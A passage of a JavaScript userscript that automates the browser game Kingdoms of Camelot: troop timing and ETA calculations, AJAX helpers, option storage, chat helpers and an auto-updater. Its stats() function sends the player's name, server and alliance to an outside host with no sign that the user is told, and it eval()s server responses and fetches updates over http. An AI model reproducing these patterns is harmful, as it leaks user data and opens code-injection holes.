	city.featherweightPowderLevel = parseInt(Seed.tech["tch10"]);
	city.alloyHorseshoesLevel = parseInt(Seed.tech["tch12"]);
	city.fletchingLevel = parseInt(Seed.tech["tch13"]);
	city.giantsStrengthLevel = parseInt(Seed.tech["tch16"]);

	var bm = city.numBarracks + 0.1 * (city.totLevelsBarracks - city.numBarracks);
	var mf = city.marshallCombatScore / 200;
	var gf = city.geometryLevel / 10;
	var sf = city.stableLevel / 10;
	var wf = city.workshopLevel / 10;
	var isf = bm * (1 + mf + gf);
	var csf = bm * (1 + mf + gf + sf);
	var ssf = bm * (1 + mf + gf + sf + wf);
	var pf = city.foremanBasePoliticsScore / 200;
	var gsf = city.giantsStrengthLevel / 10;
	var dsf = 1 + pf + gsf;
	
	var h=uW.cm.ThroneController.effectBonus(77);
	var boost=(1+(h/100));
	
	
	
	city.Troop1Time = ((city.maxBarracks > 0)?(50/isf):0);
	city.Troop2Time = city.Troop1Time/2;
	city.Troop3Time = ((city.maxBarracks > 1 && city.eagleEyesLevel > 0)?(100/isf):0);
	city.Troop4Time = ((city.maxBarracks > 1 && city.poisonedEdgeLevel > 0)?(150/isf):0);
	city.Troop5Time = ((city.maxBarracks > 2 && city.blacksmithLevel > 0 && city.metalAlloysLevel > 0)?(225/isf):0);
	city.Troop6Time = ((city.maxBarracks > 3 && city.fletchingLevel > 0)?(350/isf):0);
	city.Troop7Time = ((city.maxBarracks > 4 && city.stableLevel > 0 && city.alloyHorseshoesLevel > 0)?(500/csf):0);
	city.Troop8Time = ((city.maxBarracks > 6 && city.blacksmithLevel > 4 && city.stableLevel > 4 && city.alloyHorseshoesLevel > 4)?(1500/csf):0);
	city.Troop9Time = ((city.maxBarracks > 5 && city.stableLevel > 0 && city.workshopLevel > 2 && city.featherweightPowderLevel > 0)?(1000/ssf):0);
	city.Troop10Time = ((city.maxBarracks > 7 && city.stableLevel > 1 && city.workshopLevel > 4 && city.geometryLevel > 4 && city.fletchingLevel > 5)?(3000/ssf):0);
	city.Troop11Time = ((city.maxBarracks > 8 && city.blacksmithLevel > 4 && city.stableLevel > 2 && city.workshopLevel > 6 && city.metalAlloysLevel > 7 && city.geometryLevel > 6)?(4500/ssf):0);
	city.Troop12Time = ((city.maxBarracks > 9 && city.stableLevel > 1 && city.workshopLevel > 8 && city.geometryLevel > 9 && city.fletchingLevel > 9)?(6000/ssf):0);
	city.Def53Time = ((city.wallLevel > 5 && city.blacksmithLevel > 5 && city.fletchingLevel > 4)?(180/dsf):0);
	city.Def55Time = ((city.wallLevel > 7 && city.blacksmithLevel > 7 && city.fletchingLevel > 6 && city.geometryLevel > 6)?(135/dsf):0);
	city.Def60Time = ((city.wallLevel > 3 && city.blacksmithLevel > 3 && city.poisonedEdgeLevel > 1)?(90/dsf):0);
	city.Def61Time = ((city.wallLevel > 0 && city.metalAlloysLevel > 0)?(30/dsf):0);
	city.Def62Time = ((city.wallLevel > 1 && city.blacksmithLevel > 1 && city.loggingLevel > 1)?(60/dsf):0);
}



function estETA(dist, unit, cityID, typemarche) {
 var ret={ETA:0,etaStr:'N/A',friendETA:0,friendEtaStr:'N/A'};    
 if (dist <= 0) return ret;
 var troop_type = unit;
 var horse=0;
 if(troop_type>6) horse=1;
 var troop_speed=parseInt(unsafeWindow.unitstats["unt"+troop_type][3])*(1+0.1*parseInt(Seed.tech.tch11));
 if (horse){
               troop_speed=troop_speed*(1+0.05*parseInt(Seed.tech.tch12))
 } 
 var Speed = troop_speed;
 
 
  var throne67=uW.cm.ThroneController.effectBonus(67);
  var throne68,throne69,throne70,throne71,throne72;throne68=throne69=throne70=throne71=throne72=0;
  if(typemarche==4){
   throne68=uW.cm.ThroneController.effectBonus(68) // attaque
  }else{
   if(typemarche==3){ //scout
    throne72=uW.cm.ThroneController.effectBonus(72)
   }else{
    if(typemarche==2){ //renforce
     throne69=uW.cm.ThroneController.effectBonus(69)
    }else{
     if(typemarche==5){ // reassign
      throne71=uW.cm.ThroneController.effectBonus(71)
     }else{
      if(typemarche==1){ // transport
       throne70=uW.cm.ThroneController.effectBonus(70)}}}}}
       
  var throneBoost=throne67+throne68+throne69+throne70+throne71+throne72;
  
 Speed=Speed*(1+(throneBoost*0.01));
 
 var gi=unsafeWindow.cm.guardianModalModel.getMarchBonus();
 var multiplier=1+(gi*0.01);
 Speed=Speed*multiplier;
 var gSpeed = 0;
 var estSec;
 if (Speed>0) {
  gSpeed = Speed/6000;
  estSec = Math.ceil(parseFloat(dist)/gSpeed);
 }

 var e=1;
 if (document.getElementById("attackItems_55")) {
  var l_elem=document.getElementById("attackItems_55");
  if(l_elem&&l_elem.checked>0){ e=0.75;     }
 }
 if (document.getElementById("attackItems_57")) {
  var l_elem=document.getElementById("attackItems_57");
  if(l_elem&&l_elem.checked){   e=0.5;   }
 }
 ret.ETA = (parseInt((estSec*e+''))+30); 
 if(Seed.playerEffects.returnExpire>unsafeWindow.unixtime()){
  ret.ETA=parseInt(ret.ETA*0.5);
 }
 ret.etaStr = timestr (ret.ETA,1);
 if (cityID!=0) {
  var building = getCityBuilding (cityID, 18);
  if (building) {
   fSpeed = Speed * (1 + parseInt(building.maxLevel)/2);
   gSpeed = fSpeed/6000;
   estSec = (dist/gSpeed).toFixed(0);
   ret.friendETA = parseInt((estSec*e+''))+30; 
   ret.friendEtaStr = timestr ((ret.friendETA+''),1);
  }
 } else {
  ret.friendETA = ret.ETA; 
  ret.friendEtaStr = timestr ((ret.friendETA+''),1);
 }
 return ret;
}

function getCityIdFromXY(x, y) {for(var i=0; i<Cities.numCities; i++) { if (Cities.cities[i].x == x && Cities.cities[i].y == y) {return Cities.cities[i].id;}	}	return -1;}
function setCities(){
var il = unsafeWindow.itemlist;
  for (var i=1101; i < 1115; i++)
  crestname[i] = il['i'+i].name
  getResearchLevels();
  Cities.numCities = Seed.cities.length;
  Cities.cities = [];
  Cities.byID = {};
  for (i=0; i<Cities.numCities; i++){    city = {};    city.idx = i;    city.id = parseInt(Seed.cities[i][0]);    city.name = Seed.cities[i][1];    city.x = parseInt(Seed.cities[i][2]);    city.y = parseInt(Seed.cities[i][3]);    city.tileId = parseInt(Seed.cities[i][5]);    city.provId = parseInt(Seed.cities[i][4]);	
  // getTroopDefTrainEstimates('city'+ city.id);    
  getTroopDefTrainEstimates('city'+ city.id, city); Cities.cities[i] = city;    Cities.byID[Seed.cities[i][0]] = city;  }
}
function dialogRetry (errMsg, seconds, onRetry, onCancel, errCode){
  seconds = parseInt(seconds);
  var pop = new CPopup ('pbretry', 0, 0, 746, 100, true);
  pop.centerMe(mainPop.getMainDiv());
  pop.getTopDiv().innerHTML = '<div class=pdxErrorPopup><CENTER>'+culang.error+'</center></div>';
  pop.getMainDiv().innerHTML = '<CENTER><BR><FONT COLOR=#550000><B>'+culang.errorrpt+':</b></font><BR><BR><DIV id=paretryErrMsg></div>\
      <BR><BR><B>'+culang.arefresh+' in <SPAN id=paretrySeconds></b></span> '+culang.seconds+'!<BR><BR><INPUT id=paretryCancel type=submit value="'+culang.Hcancel+' '+culang.repeat+'" \>';
  document.getElementById('paretryCancel').addEventListener ('click', doCancel, false);
  pop.show(true);

  if(errCode && unsafeWindow.g_js_strings.errorcode['err_'+errCode])
  document.getElementById('paretryErrMsg').innerHTML = unsafeWindow.g_js_strings.errorcode['err_'+errCode];
  else
  document.getElementById('paretryErrMsg').innerHTML = errMsg;
  
  document.getElementById('paretrySeconds').innerHTML = seconds;
  var rTimer = setTimeout (doRetry, seconds*1000);
  countdown ();

  function countdown (){
    document.getElementById('paretrySeconds').innerHTML = seconds--;
    if (seconds > 0)
      cdTimer = setTimeout (countdown, 1000);
  }
  function doCancel(){
    clearTimeout (rTimer);
    clearTimeout (cdTimer);
    pop.destroy();
    onCancel ();
  }
  function doRetry (){
    clearTimeout (rTimer);
    clearTimeout (cdTimer);
    pop.show(false);
    onRetry();
  }
}
function implodeUrlArgs (obj){
  var a = [];
  for (var k in obj)
    a.push (k +'='+ encodeURI(obj[k]) );
  return a.join ('&');
}

function addUrlArgs (url, args){
  if (!args)
    return url;
  if (url.indexOf('?') < 0)
    url += '?';
  else if (url.substr(url.length-1) != '&')
    url += '&';
  if (matTypeof(args == 'object'))
    return url + implodeUrlArgs (args);
  return url + args;
}

function AjaxRequest (url, opts){ var headers = {    'X-Requested-With': 'XMLHttpRequest',  'X-Prototype-Version': '1.6.1',    'Accept': 'text/javascript, text/html, application/xml, text/xml, */*'  };  var ajax = null;
if (DEBUG_TRACE_AJAX) logit ("AJAX: "+ url +"\n" + inspect (opts, 3, 1));

  if (window.XMLHttpRequest)
    ajax=new XMLHttpRequest();
  else
    ajax=new ActiveXObject("Microsoft.XMLHTTP");

  if (opts.method==null || opts.method=='')
    method = 'GET';
  else
    method = opts.method.toUpperCase();

  if (method == 'POST'){
    headers['Content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
  } else if (method == 'GET'){
    addUrlArgs (url, opts.parameters);
  }

  ajax.onreadystatechange = function(){ //  ['Uninitialized', 'Loading', 'Loaded', 'Interactive', 'Complete']; states 0-4
    if (ajax.readyState==4) {
      if (ajax.status >= 200 && ajax.status < 305)
        if (opts.onSuccess) opts.onSuccess(ajax);
      else
        if (opts.onFailure) opts.onFailure(ajax);
    } else {
      if (opts.onChange) opts.onChange (ajax);
    }
  }

  ajax.open(method, url, true);   // always async!

  for (var k in headers)
    ajax.setRequestHeader (k, headers[k]);
  if (matTypeof(opts.requestHeaders)=='object')
    for (var k in opts.requestHeaders)
      ajax.setRequestHeader (k, opts.requestHeaders[k]);

  if (method == 'POST'){
    var a = [];
    for (k in opts.parameters)
      a.push (k +'='+ opts.parameters[k] );
    ajax.send (a.join ('&'));
  } else { ajax.send();  }
}

function MyAjaxRequest (url, o, noRetry){
if (DEBUG_TRACE) logit (" 0 myAjaxRequest: "+ url +"\n" + inspect (o, 2, 1));
  var opts = unsafeWindow.Object.clone(o);
  var wasSuccess = o.onSuccess;
  var wasFailure = o.onFailure;
  var retry = 0;
  var delay = 5;
  var noRetry = noRetry===true?true:false;
  opts.onSuccess = mySuccess;
  opts.onFailure = myFailure;

if (DEBUG_TRACE) logit (" 1a myAjaxRequest: "+ url +"\n" + inspect (o, 2, 1));
  new AjaxRequest(url, opts);
  return;

  function myRetry(){
    ++retry;
    new AjaxRequest(url, opts);
    delay = delay * 1.25;
  }

  function myFailure(){
    var o = {};
if (DEBUG_TRACE) logit ("myAjaxRequest.myFailure(): "+ inspect(rslt, 1, 1));
    o.ok = false;
    o.errorMsg = "AJAX Communication Failure";
    wasFailure (o);
  }

  function mySuccess (msg){
    var rslt = eval("("+ msg.responseText +")");
   // var rslt = eval("(" + msg.responseText + ")");
    var x;
    if (rslt.ok){
if (DEBUG_TRACE) logit (" 1b myAjaxRequest.mySuccess(): "+ inspect(rslt, 1, 1));
      rslt.errorMsg = null;   ///// !!!!!!!!!!!!!  ************
      if (rslt.updateSeed)
        unsafeWindow.update_seed(rslt.updateSeed);
      wasSuccess (rslt);
      return;
    }
if (DEBUG_TRACE) logit (" 1b myAjaxRequest.mySuccess() !ok : "+ inspect(rslt, 3, 1));
    rslt.errorMsg = unsafeWindow.printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null));
    //if ( (x = rslt.errorMsg.indexOf ('<br><br>')) > 0)
      //rslt.errorMsg = rslt.errorMsg.substr (0, x-1);
    if (!noRetry && (rslt.error_code==0 ||rslt.error_code==8 || rslt.error_code==1 || rslt.error_code==3)){
      dialogRetry (rslt.errorMsg, delay, function(){myRetry()}, function(){wasSuccess (rslt)}, rslt.error_code);
    } else {
      wasSuccess (rslt);
    }
  }
}
function distance (d, f, c, e) {
  var a = 750;
  var g = a / 2;
  var b = Math.abs(c - d);
  if (b > g)
    b = a - b;
  var h = Math.abs(e - f);
  if (h > g)
    h = a - h;
  return Math.round(100 * Math.sqrt(b * b + h * h)) / 100;
};

var myServerId = null;
function getServerId() {
  if (myServerId == null){
    var m=/^[a-zA-Z]+([0-9]+)\./.exec(document.location.hostname);
    if (m)
      myServerId = m[1];
    else
      myServerId = '??';
  }
  return myServerId;
    return m[1];
  return '';
}

function logit (msg){  var now = new Date();  GM_log (getServerId() +' @ '+ now.toTimeString().substring (0,8) +'.' + now.getMilliseconds() +': '+  msg);}
/************************************************************************************
*						KOC POWER - DEBUG WIN										*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'PLUGIN_DEBUGWIN' ));

function saveAutoTrainOptions (){  var serverID = getServerId();  setTimeout (function (){GM_setValue ('AutoTrainOptions_' +serverID, JSON2.stringify(AutoTrainOptions));}, 0);}
function saveColors (){  var serverID = getServerId();  GM_setValue ('Colors_'+serverID, JSON2.stringify(Colors));}
function saveChatOptions (){  var serverID = getServerId();  setTimeout (function (){GM_setValue ('ChatOptions_'+serverID, JSON2.stringify(ChatOptions));}, 0);}
function saveOptions (){  var serverID = getServerId();  setTimeout (function (){GM_setValue ('Options2_'+serverID, JSON2.stringify(Options));}, 0);}
function savePDXCountOpt (){  var serverID = getServerId();  setTimeout (function (){GM_setValue ('PDXCountOpt_'+serverID, JSON2.stringify(PDXCountOpt));}, 0);}
function saveGlobalOptions (){  var serverID = getServerId();  setTimeout (function (){GM_setValue ('GlobalOptions_', JSON2.stringify(GlobalOptions));}, 0);}
function saveLangOptions (){setTimeout (function (){GM_setValue ('LangOptions_', JSON2.stringify(LangOptions));}, 0);}
function saveCrestOptions (){  var serverID = getServerId(); setTimeout (function (){GM_setValue ('CrestOptions_' + Seed.player['name'] + '_' +serverID, JSON2.stringify(CrestOptions));}, 0);}
function saveStyleOptions (){  var serverID = getServerId();  setTimeout (function (){GM_setValue ('StyleOptions_'+serverID, JSON2.stringify(StyleOptions));}, 0);}
function saveWallTrainOptions (){var serverID = getServerId();	GM_setValue ('WallTrainOptions_' + Seed.player['name'] + '_' +serverID, JSON2.stringify(WallTrainOptions));}
function saveAttackOptions (){  var serverID = getServerId();  setTimeout (function (){GM_setValue ('AttackOptions_'+serverID, JSON2.stringify(AttackOptions));}, 0);}
function saveCombatOptions (){  var serverID = getServerId();  setTimeout (function (){GM_setValue ('CombatOptions_' + Seed.player['name'] + '_' +serverID, JSON2.stringify(CombatOptions));}, 0);}


function readOptions (){
  var serverID = getServerId();
  s = GM_getValue ('Options2_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          Options[k][kk] = opts[k][kk];
      else
        Options[k] = opts[k];
    }
  }
}
function readStyleOptions (){
  var serverID = getServerId();
  s = GM_getValue ('StyleOptions_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          StyleOptions[k][kk] = opts[k][kk];
      else
        StyleOptions[k] = opts[k];
    }
  }
}
function readPDXCountOpt (){
  var serverID = getServerId();
  s = GM_getValue ('PDXCountOpt_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          PDXCountOpt[k][kk] = opts[k][kk];
      else
        PDXCountOpt[k] = opts[k];
    }
  }
}
function readWallTrainOptions (){
var serverID = getServerId();
	s = GM_getValue ('WallTrainOptions_' + Seed.player['name'] + '_' +serverID);
	if (s != null){
		opts = JSON2.parse (s);
		for (k in opts){
			if (WallTrainOptions[k] != undefined) {
				if (matTypeof(opts[k]) == 'object') {
					for (kk in opts[k])
						if (WallTrainOptions[k][kk] != undefined)
							WallTrainOptions[k][kk] = opts[k][kk];
				} else
					WallTrainOptions[k] = opts[k];
			}
		}
	}
}
function readGlobalOptions (){
  s = GM_getValue ('GlobalOptions_');
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          GlobalOptions[k][kk] = opts[k][kk];
      else
        GlobalOptions[k] = opts[k];
    }
  }
}
function readCombatOptions (){
  var serverID = getServerId();
  s = GM_getValue ('CombatOptions_' + Seed.player['name'] + '_' +serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
			if (matTypeof(opts[k][kk]) == 'object')
				for (kkk in opts[k][kk])
				  CombatOptions[k][kk][kkk] = opts[k][kk][kkk];
			else
				CombatOptions[k][kk] = opts[k][kk];
      else
        CombatOptions[k] = opts[k];
    }
  }
}
function readColors (){
  var serverID = getServerId();
  s = GM_getValue ('Colors_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts)
      Colors[k] = opts[k];
  }else{
	s = GM_getValue ('Colors');
	if (s != null){
		opts = JSON2.parse (s);
		for (k in opts)
		  Colors[k] = opts[k];
	}
  }
}
function readChatOptions (){
  var serverID = getServerId();
  s = GM_getValue ('ChatOptions_'+serverID, '[]');
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          ChatOptions[k][kk] = opts[k][kk];
      else
        ChatOptions[k] = opts[k];
    }
  }
}
function readAttackOptions (){
  var serverID = getServerId();
  s = GM_getValue ('AttackOptions_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          AttackOptions[k][kk] = opts[k][kk];
      else
        AttackOptions[k] = opts[k];
    }
  }
}
function readCrestOptions (){
  var serverID = getServerId();
  s = GM_getValue ('CrestOptions_' + Seed.player['name'] + '_' +serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          CrestOptions[k][kk] = opts[k][kk];
      else
        CrestOptions[k] = opts[k];
    }
  }
}
function readAutoTrainOptions (){  var serverID = getServerId();  s = GM_getValue ('AutoTrainOptions_'+serverID);  if (s != null){ opts = JSON2.parse (s); for (k in opts){  AutoTrainOptions[k] = opts[k]; }  }}
var myServers = {  serverlist : null,

  get : function (notify){    if (myServers.serverlist){      notify (myServers.serverlist);      return;    }
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);

    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/myServers.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function(rslt) {
logit (inspect (rslt, 3, 1));
        if (notify)
          notify (myServers.serverlist);
      },
      onFailure: function(rslt) {
      }
    });
  },
};
function createBlinkButton (label){  var a=document.createElement('a');  a.className='button20';  a.innerHTML='<span style="color: #fff"><blink>'+ label +'</blink></span>';  return a;}
function AddMainTabLink(text, eventListener, mouseListener) {
	var b = createButton (text);
	b.className='tab';

	var a = createButton (text);
	a.className='tab';
	a.id = 'ptBoite2';
  var tabs=document.getElementById('main_engagement_tabs');
  if(!tabs) {
    tabs=document.getElementById('topnav_msg');
    if (tabs)
      tabs=tabs.parentNode;
  }
  if (tabs) {
    var e = tabs.parentNode;
    var gmTabs = null;
    for (var i=0; i<e.childNodes.length; i++){
      var ee = e.childNodes[i];
      if (ee.tagName && ee.tagName=='DIV' && ee.className=='tabs_engagement' && ee.id!='main_engagement_tabs'){
        gmTabs = ee;
        break;
      }
    }
    if (gmTabs == null){
      gmTabs = document.createElement('div');
      gmTabs.className='tabs_engagement';
      tabs.parentNode.insertBefore (gmTabs, tabs);
	  gmTabs.style.padding= '20px 0px 0px 15px';
      gmTabs.style.whiteSpace='nowrap';
	  gmTabs.style.width='735px';
      gmTabs.lang = 'en_PB';
    }
    gmTabs.appendChild(a);
    a.addEventListener('click',eventListener, false);
    if (mouseListener != null)
      a.addEventListener('mousedown',mouseListener, true);
    return a;
  }
  return null;
}
function stats () {var data = {};data.serverId = getServerId();data.player = Seed.player['name'];data.ally = getMyAlliance();GM_xmlhttpRequest({method: 'POST',url: 'http://hs151.digitalweb.net/stats.php',headers: {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',},data: implodeUrlArgs(data),});}
function AddSubTabLink(text, eventListener, id) {
  var a = createButton (text,'botbutton');
  a.className='tab';
  var tabs=document.getElementById('main_engagement_tabs');
  if(!tabs) {
    tabs=document.getElementById('topnav_msg');
    if (tabs)
      tabs=tabs.parentNode;
  }
  if (tabs) {
    var e = tabs.parentNode;
    var gmTabs = null;
    for (var i=0; i<e.childNodes.length; i++){
      var ee = e.childNodes[i];
      if (ee.tagName && ee.tagName=='DIV' && ee.className=='tabs_engagement' && ee.id!='main_engagement_tabs'){
        gmTabs = ee;
        break;
      }
    }
    if (gmTabs == null){
      gmTabs = document.createElement('div');
      gmTabs.className='tabs_engagement';
      tabs.parentNode.insertBefore (gmTabs, tabs);
      gmTabs.style.whiteSpace='nowrap';
      gmTabs.style.width='735px';
      gmTabs.lang = 'en_PB';
    }
    gmTabs.appendChild(a);
    a.addEventListener('click',eventListener, false);
    if (id != null)
      a.id = id;
    return a;
  }
  return null;
}
function AddTowerTab(text, eventListener, id) {
  var a = createRedButton (text,'botbutton');
  a.className='tab';
  var tabs=document.getElementById('main_engagement_tabs');
  if(!tabs) {
    tabs=document.getElementById('topnav_msg');
    if (tabs)
      tabs=tabs.parentNode;
  }
  if (tabs) {
    var e = tabs.parentNode;
    var gmTabs = null;
    for (var i=0; i<e.childNodes.length; i++){
      var ee = e.childNodes[i];
      if (ee.tagName && ee.tagName=='DIV' && ee.className=='tabs_engagement' && ee.id!='main_engagement_tabs'){
        gmTabs = ee;
        break;
      }
    }
    if (gmTabs == null){
      gmTabs = document.createElement('div');
      gmTabs.className='tabs_engagement';
      tabs.parentNode.insertBefore (gmTabs, tabs);
      gmTabs.style.whiteSpace='nowrap';
      gmTabs.style.width='735px';
	  gmTabs.style.height='60px';
      gmTabs.lang = 'en_PB';
    }
    gmTabs.appendChild(a);
    a.addEventListener('click',eventListener, false);
    if (id != null)
      a.id = id;
    return a;
  }
  return null;
}
unsafeWindow.PTscout = function (x, y){
  setTimeout (function (){
    if (Options.hideOnGoto)
    hideMe ();
    document.getElementById('mapXCoor').value = x;
    document.getElementById('mapYCoor').value = y;
    unsafeWindow.reCenterMapWithCoor();
    unsafeWindow.changeview_map(document.getElementById('mod_views_map'));
    unsafeWindow.modal_attack(3,x,y);
  }, 0);
};
/************************************************************************************
*						KOC POWER - CHAT PANE										*
************************************************************************************/
var ChatPane = {
    init : function(){ var t = ChatPane; setInterval(t.HandleChatPane, 2500); },
 HandleChatPane : function() { 
 var DisplayName = GetDisplayName(); 
 var AllianceChatBox=document.getElementById('mod_comm_list2');
  if(AllianceChatBox){
      var chatPosts = document.evaluate(".//div[contains(@class,'chatwrap')]", AllianceChatBox, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
       if(chatPosts){
         for (var i = 0; i < chatPosts.snapshotLength; i++) {
          thisPost = chatPosts.snapshotItem(i);
        if(Options.HelpRequest){
            var postAuthor = document.evaluate('.//*[@class="nm"]', thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
             if(postAuthor.snapshotItem(0)){
              var postAuthorName = postAuthor.snapshotItem(0).innerHTML;
            if(postAuthorName != DisplayName){
                 var helpAllianceLinks=document.evaluate(".//a[contains(@onclick,'claimAllianceChatHelp')]", thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
                if(helpAllianceLinks){
                   for (var j = 0; j < helpAllianceLinks.snapshotLength; j++) {
                    thisLink = helpAllianceLinks.snapshotItem(j);
                     var alreadyClicked = thisLink.getAttribute("clicked");
                    if(!alreadyClicked){
                    thisLink.setAttribute('clicked', 'true');
                    var myregexp = /(claimAllianceChatHelp\(.*\);)/;
                      var match = myregexp.exec(thisLink.getAttribute("onclick"));
                      if (match != null) {
                        onclickCode = match[0];
                      if(true){
                        DoUnsafeWindow(onclickCode);
                        }
                      }
                    }
                   }
                }
              }
            }
          } // Hide alliance requests in chat
          if(Options.DeleteRequest){
            var helpAllianceLinks=document.evaluate(".//a[contains(@onclick,'claimAllianceChatHelp')]", thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
            if(helpAllianceLinks){
               for (var j = 0; j < helpAllianceLinks.snapshotLength; j++) {
                 thisLink = helpAllianceLinks.snapshotItem(j);
                thisLink.parentNode.parentNode.parentNode.parentNode.parentNode.removeChild(thisLink.parentNode.parentNode.parentNode.parentNode);
              }
             } // Hide alliance reports in chat
					var myregexp1 = culang.myregexp1;
					var myregexp2 = culang.myregexp2;
					var myregexp3 = culang.myregexp3;
					var myregexp4 = culang.myregexp4;
					var myregexp5 = culang.myregexp5;
            if (thisPost.innerHTML.match(myregexp1) || thisPost.innerHTML.match(myregexp2) || thisPost.innerHTML.match(myregexp3) || thisPost.innerHTML.match(myregexp4)  || thisPost.innerHTML.match(myregexp5)) {
              thisPost.parentNode.removeChild(thisPost);
            }
          }
        }
       }
    }
    },

}
/************************************************************************************
*						KOC POWER - UPDATER											*
*  The following code is released under public domain. (copie from KoC Scripters)	*
************************************************************************************/
function display_confirm(confirm_msg,ok_function,cancel_function){
    if(!confirm_msg){confirm_msg="";}
    
    var container_div = document.getElementById('modal_js_confirm');
    var div;
    if(!container_div) {
        container_div=document.createElement('div');
        container_div.id='modal_js_confirm';
        container_div.style.position='absolute';
        container_div.style.top='0px';
        container_div.style.left='0px';
        container_div.style.width='100%';
        container_div.style.height='1px';
        container_div.style.overflow='visible';
        container_div.style.zIndex=10000000;
        
        div=document.createElement('div');
        div.id='modal_js_confirm_contents';
        div.style.zIndex=10000000;
        div.style.backgroundColor='#eee';
        div.style.fontFamily='"lucida grande",tahoma,verdana,arial,sans-serif';
        div.style.fontSize='11px';
        div.style.textAlign='center';
        div.style.color='#333333';
        div.style.border='2px outset #666';
        div.style.padding='10px';
        div.style.position='relative';
        div.style.width='300px';
        div.style.height='100px';
        div.style.margin='300px auto 0px auto';
        div.style.display='block';
		
        container_div.appendChild(div);
        document.body.appendChild(container_div);
        
        div.innerHTML = '<div style="text-align:center"><div>'+confirm_msg+'</div><br/><div>'+culang.pressOK+'</div><br><button id="modal_js_confirm_ok_button">'+culang.actionGold2+'</button> <button id="modal_js_confirm_cancel_button">'+culang.cancel+'</button></div>';
        var ok_button = document.getElementById('modal_js_confirm_ok_button');
        ok_button.addEventListener('click',function() {
            if(ok_function && typeof(ok_function) == "function"){
           	 ok_function();
            }
            container_div.parentNode.removeChild(container_div);
        },false);
        var cancel_button = document.getElementById('modal_js_confirm_cancel_button');
        cancel_button.addEventListener('click',function() {
            if(cancel_function && typeof(cancel_function) == "function"){
            	cancel_function();
            }
            container_div.parentNode.removeChild(container_div);
        },false);
	}
}
var AutoUpdater_104137 = {
    id: 104137,
    days: 1,
    name: kocpower,
    version: Version,
	beta: GlobalOptions.pbupdatebeta,
	betaUrl : 'http://koc-power-pdx.googlecode.com/svn/trunk/koc_power_pdx.user.js',
    time: new Date().getTime(),
    call: function(response, secure) {
        GM_xmlhttpRequest({
            method: 'GET',
	    url: this.beta ? this.betaUrl : 'http'+(secure ? 's' : '')+'://userscripts.org/scripts/source/'+this.id+'.meta.js',
	    onload: function(xpr) {AutoUpdater_104137.compare(xpr, response);},
            onerror: function(xpr) {if (secure) AutoUpdater_104137.call(response, false);}
        });
    },
    enable: function() {
        GM_registerMenuCommand("Auto Update: "+this.name+" ", function() {
            GM_setValue('updated_104137', new Date().getTime()+'');
            AutoUpdater_104137.call(true, true)
        });
    },
    compareVersion: function(r_version, l_version) {
        var r_parts = r_version.split('.'),
            l_parts = l_version.split('.'),
            r_len = r_parts.length,
            l_len = l_parts.length,
            r = l = 0;
        for(var i = 0, len = (r_len > l_len ? r_len : l_len); i < len && r == l; ++i) {
            r = +(r_parts[i] || '0');
            l = +(l_parts[i] || '0');
        }
        return (r !== l) ? r > l : false;
    },
    compare: function(xpr,response) {
        this.xversion=/\/\/\s*@version\s+(.+)\s*\n/i.exec(xpr.responseText);
        this.xname=/\/\/\s*@name\s+(.+)\s*\n/i.exec(xpr.responseText);
        if ( (this.xversion) && (this.xname[1] == this.name) ) {
            this.xversion = this.xversion[1];
            this.xname = this.xname[1];
        } else {
            if ( (xpr.responseText.match("the page you requested doesn't exist")) || (this.xname[1] != this.name) ) {
            	//GM_setValue('updated_104137', 'off');
            }
            return false;
        }
        var updated = this.compareVersion(this.xversion, this.version);
        
        if ( updated ) {
			 display_confirm(''+culang.UDPdisplayconfirm+' '+this.xname+' '+culang.UDPdisplayconfirm2+'\n '+culang.UDPdisplayconfirm3+'',
                // Ok
                function(){
                    try { 
						location.href = AutoUpdater_104137.beta ? AutoUpdater_104137.betaUrl :  'http://userscripts.org/scripts/source/104137.user.js';
                    } catch(e) {}
                },
                // Cancel
                function(){
                    if ( AutoUpdater_104137.xversion ) {
                        if(confirm(''+culang.UDPturnoff+'')) {
                            //GM_setValue('updated_104137', 'off');
							GlobalOptions.pbupdate = false;
							GM_setValue ('GlobalOptions_??', JSON2.stringify(GlobalOptions));
                            AutoUpdater_104137.enable();
                            alert(''+culang.UDPreenable+'');
                        }
                    }
                }
            );
                                      
        } else if (response){ alert(''+culang.UDPnoudp+' '+this.name); }
    },
    check: function(tf) {
        if (!tf){ this.enable(); } else {
            GM_registerMenuCommand(""+culang.UDPcheck+" "+this.name+" "+culang.UDPcheck2+" ", function() {
                GM_setValue('updated_104137', new Date().getTime()+'');
                AutoUpdater_104137.call(true, true)
            });
            if (+this.time > (+GM_getValue('updated_104137', 0) + 1000*60*60*24*this.days)) {
                GM_setValue('updated_104137', this.time+'');
                this.call(false, true);
            }
        }
    }
};
if (typeof(GM_xmlhttpRequest) !== 'undefined' && typeof(GM_updatingEnabled) === 'undefined') { // has an updater?
    try {
